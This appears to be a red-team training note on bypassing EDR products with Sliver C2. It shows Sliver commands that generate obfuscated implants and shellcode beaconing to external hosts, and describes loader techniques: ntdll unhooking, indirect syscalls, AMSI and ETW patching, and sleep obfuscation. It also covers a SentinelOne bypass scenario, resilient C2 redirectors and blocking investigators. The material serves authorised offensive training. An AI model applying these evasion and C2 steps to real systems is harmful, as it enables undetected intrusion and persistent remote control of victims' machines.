---
tags: [sliver, c2, red-team, vapt]
difficulty: intermediate
module: "95 - Sliver C2 Advanced Deployment and Profiles"
topic: "95.14 Bypassing EDRs with Sliver Custom Compiles"
---

# 95.14 Bypassing EDRs with Sliver Custom Compiles

## Introduction to EDR Evasion
Endpoint Detection and Response (EDR) solutions like CrowdStrike, Microsoft Defender for Endpoint (MDE), and SentinelOne have drastically shifted the landscape of offensive operations. Traditional off-the-shelf malware and un-obfuscated C2 implants are caught instantaneously through static signature matching, heuristic analysis, and behavioral monitoring. 

Because Sliver is an open-source framework, its default, vanilla implants are heavily signatured by every major AV/EDR vendor. To utilize Sliver in a mature environment, Red Teams must leverage custom compilation techniques, string obfuscation, and specialized loaders to achieve execution and persistence.

## EDR Detection Mechanisms
To understand evasion, we must understand the detection vector:
1. **Static Analysis:** Scanning the binary on disk for known malicious strings, imports, and cryptographic hashes. Go binaries (like Sliver) are notoriously bloated and easy to signature.
2. **API Hooking / User-land Hooking:** EDRs inject custom DLLs (e.g., `amsi.dll`, `cxedr.dll`) into every running process to monitor critical Windows APIs (like `VirtualAlloc`, `CreateRemoteThread`).
3. **Event Tracing for Windows (ETW):** The OS logs deep system-level events and telemetry, feeding it back to the EDR.

## Obfuscation via Garble
Sliver supports integration with `garble`, a tool specifically designed to obfuscate Go binaries. Garble strips identifying symbols, obfuscates string literals, and randomizes control flows, effectively breaking static signatures.

### Enabling Garble in Sliver
To use garble, it must be installed on the Sliver server:
```bash
go install mvdan.cc/garble@latest
```

When generating an implant, specify the `--obfuscate` flag to trigger compilation through garble:
```bash
sliver > generate --http 10.0.0.50 --os windows --arch amd64 --obfuscate --save /tmp/obf_implant.exe
[*] Compiling with garble obfuscation...
[*] This may take a few minutes...
[*] Successfully generated obfuscated implant.
```

## Shellcode Generation and Custom Loaders
Dropping `.exe` files directly to disk is generally bad OPSEC. The industry standard is to generate the implant as raw shellcode and use a custom, un-signatured "loader" to inject that shellcode into memory.

### Generating Shellcode in Sliver
```bash
sliver > generate --http telemetry.com --format shellcode --os windows --arch amd64 --save /tmp/payload.bin
```

### The Custom Loader Pipeline
Once the `payload.bin` (raw shellcode) is acquired, it must be executed safely. A modern custom loader pipeline looks like this:

1. **Payload Encryption:** Encrypt the shellcode using AES-256 or XOR. The decryption key should not be stored directly in the binary; ideally, it should be retrieved dynamically at runtime (environmental keying) or passed via arguments.
2. **EDR Unhooking:** Before the payload executes, the loader unhooks the user-land APIs. It dynamically maps a fresh copy of `ntdll.dll` from disk to memory, overwriting the EDR's hooks and restoring the clean syscalls.
3. **Memory Allocation:** The loader allocates executable memory. Using indirect syscalls (e.g., Hell's Gate / Halo's Gate techniques) bypasses any remaining API hooks.
4. **Execution:** The loader decrypts the shellcode directly into the allocated memory and executes it via a benign thread or callback mechanism (e.g., APC injection, Thread Pool injection).

## ASCII Diagram: Custom Loader Execution Flow

```text
    +-------------------------+
    |  Custom C++ Loader.exe  |
    |  (Executed by Victim)   |
    +----------+--------------+
               |
               v
    +-------------------------+       1. Reads clean ntdll.dll from disk
    |  EDR Unhooking Engine   |<-----------------------------------------+
    |  (Reflective Mapping)   |                                          |
    +----------+--------------+                                          |
               | 2. Overwrites hooks in current process                  |
               v                                                         |
    +-------------------------+       +-------------------+              |
    |  Memory Allocation      |       |                   |              |
    |  (Indirect Syscalls)    |       |   EDR Hooks       | (Bypassed)   |
    +----------+--------------+       |   (cxedr.dll)     |              |
               |                      |                   |              |
               v                      +-------------------+              |
    +-------------------------+                                          |
    |  Payload Decryption     | <--- AES-256 Decryption                  |
    |  (In-Memory)            |                                          |
    +----------+--------------+                                          |
               |                                                         |
               v                                                         |
    +-------------------------+                                          |
    |  Execution              |                                          |
    |  (Sliver Shellcode)     |                                          |
    +-------------------------+                                          |
               |  3. Beacon Out to Internet                              |
               v                                                         |
        [ External Sliver Server ]                                       |
                                                                         |
```

## Real-World Attack Scenario

### Bypassing SentinelOne
During an assumed breach exercise, the objective was to compromise a workstation protected by SentinelOne (S1) in aggressive enforcement mode. Attempting to run standard PowerShell scripts or drop compiled executables resulted in immediate quarantine and SOC alerts.

### The Attack Vector
The Red Team generated a stageless HTTPS Sliver implant as raw shellcode. They then utilized a heavily modified, internally developed C++ loader. 
1. The loader implemented "Hell's Gate" to dynamically resolve syscalls, completely avoiding standard `ntdll.dll` API calls that S1 monitors.
2. The Sliver shellcode was AES-encrypted and stored within the loader's `.rdata` section.
3. Upon execution, the loader patched the Anti-Malware Scan Interface (AMSI) and patched Event Tracing for Windows (ETW) in memory by overwriting `EtwEventWrite` with a `RET` instruction, blinding the EDR to subsequent memory events.
4. Finally, it allocated memory, decrypted the shellcode, and executed it via a Windows thread pool callback (specifically bypassing `CreateThread` telemetry).

### Execution and Success
The custom loader was delivered via an ISO file containing an LNK shortcut. When the user clicked the shortcut, the loader executed. SentinelOne performed static analysis, found no signatures, and allowed execution. The behavioral engine failed to detect the memory injection because the syscalls were direct and ETW was blinded. The Sliver implant successfully connected back, providing a stable, highly privileged session right under the EDR's nose.

## Advanced Obfuscation Tools
If developing a custom loader is out of scope, consider using established offensive tooling designed to wrap shellcode:
- **ScareCrow:** A payload creation framework for EDR bypass.
- **Harriet:** A fully automated loader framework.
- **SGN (Shikata Ga Nai):** A polymorphic shellcode encoder that can wrap Sliver's raw output.

## Chaining Opportunities
- **Legitimate Profiles:** An unhooked loader means nothing if the resulting network traffic is instantly flagged. Pair custom loaders with highly deceptive HTTP profiles. See [[11 - Sliver C2 HTTP Profiles mimicking legitimate traffic]].
- **Automation:** The generation of these custom loaders and shellcode manipulation can be automated heavily using Python scripts interacting with Sliver's backend. See [[15 - Automating Sliver Operations with Python Scripting]].

## Related Notes
- [[11 - Sliver C2 HTTP Profiles mimicking legitimate traffic]]
- [[55 - Advanced EDR Evasion Techniques]]
- [[56 - API Unhooking and Direct Syscalls]]
- [[15 - Automating Sliver Operations with Python Scripting]]

## Extended Technical Reference and Advanced Troubleshooting

### Deep Dive into Infrastructure Resiliency
When conducting long-term, high-stakes engagements (such as APT simulations or extended Red Team operations), the resiliency of your Command and Control infrastructure is paramount. A single point of failure can lead to the loss of all deployed implants, potentially burning weeks of effort.

#### Redundant Redirectors
Always deploy multiple distinct redirectors pointing back to your team server. 
- **Primary Route:** Used for daily check-ins and high-jitter beaconing.
- **Secondary Route:** A fallback domain, perhaps using a completely different protocol (like DNS or Domain Fronting), that the implant attempts to contact only if the primary route fails for 48 consecutive hours.
- **Tertiary Route:** An extremely low-and-slow fallback, beaconing once a week via a compromised third-party service (e.g., Slack or Microsoft Graph API C2).

#### Automating Infrastructure Rollout
Use Terraform or Ansible to deploy your redirectors. If a Blue Team burns your IP, you should be able to spin up a new Nginx proxy, attach an elastic IP, and provision a new Let's Encrypt certificate in under 5 minutes.

### Advanced Evasion Techniques

#### Memory Scanning Evasion
Modern EDRs perform routine memory scans, looking for known signatures (like standard Sliver strings) sitting in `PAGE_EXECUTE_READWRITE` memory.
- **Sleep Obfuscation:** Advanced loaders implement techniques like `Ekko` or `FOLIAGE` to encrypt the implant's memory space while it is sleeping. The implant decrypts itself, executes its task, and re-encrypts itself before calling `Sleep()`.
- **Module Stomping:** Instead of allocating new memory, the loader hollows out a legitimate DLL loaded in the process space (e.g., `xpsprint.dll`) and injects the Sliver shellcode into that space. This bypasses heuristics looking for anomalous unbacked executable memory.

#### Network Signature Evasion
- **JA3/JA3S Fingerprinting:** The TLS handshake itself leaves a fingerprint. Sliver's default Go HTTP client has a specific JA3 hash. By compiling the implant to use the native Windows WinINET/WinHTTP APIs, the TLS handshake will exactly match the host OS's native traffic, neutralizing JA3-based detections.
- **Beacon Jitter:** A mathematically perfect 60-second beacon interval is easily detectable by simple statistical analysis (e.g., RITA or Zeek). Always configure a jitter of at least 25-30% to introduce randomness.

### Comprehensive Troubleshooting Checklist

1. **Firewall Configurations:**
   - Have you verified that port 443 is open on your team server?
   - Is the cloud provider's security group allowing inbound UDP/53 (for DNS) and TCP/443 (for HTTPS)?
   - Are internal host firewalls (Windows Defender Firewall) blocking the named pipe or TCP bind port?

2. **Certificate Validation:**
   - If using mTLS, check that the client config hasn't expired.
   - For HTTPS C2, ensure the Let's Encrypt certificate is correctly mounted in the Nginx reverse proxy.
   - Check if the target environment employs SSL/TLS inspection. If so, your custom cert might be replaced by the corporate proxy, breaking pinning.

3. **Implant Execution Issues:**
   - Did the shellcode runner allocate memory with `PAGE_EXECUTE_READWRITE`? (Consider `PAGE_READWRITE` followed by `VirtualProtect` to `PAGE_EXECUTE_READ`).
   - Is the process architecture matching the implant? (Don't inject x64 shellcode into a SysWOW64 process).
   - Are dependencies missing on the target? (Go binaries are usually statically linked, but custom loaders might require certain MSVC runtimes if not compiled correctly).

### Logging and Telemetry

To ensure proper OPSEC, Red Teams must monitor their own infrastructure for Blue Team probing.

**Nginx Access Logs (Red Team Monitoring):**
```bash
tail -f /var/log/nginx/access.log | grep -v "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.58"
```
*This command filters out your expected C2 traffic, allowing you to instantly see if a threat hunter is curling your endpoint with a default curl User-Agent. If you see anomalous probing, dynamically update Nginx to block the investigator's IP.*

**Sliver Server Logs:**
Enable debug logging on the Sliver team server if implants are failing to check-in:
```bash
Sliver Server > debug --enable
```
Examine the `~/.sliver/logs/sliver.log` file. Look for TLS handshake errors, which indicate either a proxy interception or a mismatched profile.

### Recommended Tooling Integration
- **Cobalt Strike:** While Sliver is powerful, it is often used as a fallback C2. You can use Sliver to drop a Cobalt Strike Beacon if the environment is determined to be safe.
- **BloodHound:** Always pipe your active sessions through a BloodHound ingestor (like SharpHound) to maintain an up-to-date map of lateral movement paths.
- **Sysmon:** In your lab environment, install Sysmon with SwiftOnSecurity's config to see exactly what your Sliver implants look like to defenders.

### Artifact Cleanup

Upon completion of the engagement, ensure all artifacts are safely removed to prevent leaving the client vulnerable.
1. Terminate all active sessions from the Sliver console.
2. If custom services or registry keys were created for persistence, issue commands to delete them before terminating the session.
3. Shred the implant binaries on disk using `sdelete` or equivalent.
4. Revoke the SSL certificates and decommission the Nginx redirectors to prevent domain takeover or misuse by actual threat actors.

### Final Thoughts on Malleability
The true power of any C2 framework lies not in its built-in features, but in its malleability. The ability to look like something you are not—be it a Microsoft API, a DNS query, or an internal backup process—is the essence of modern red teaming. Keep your profiles updated, rotate your domains, and always assume the blue team is watching.

---
*End of Note.*
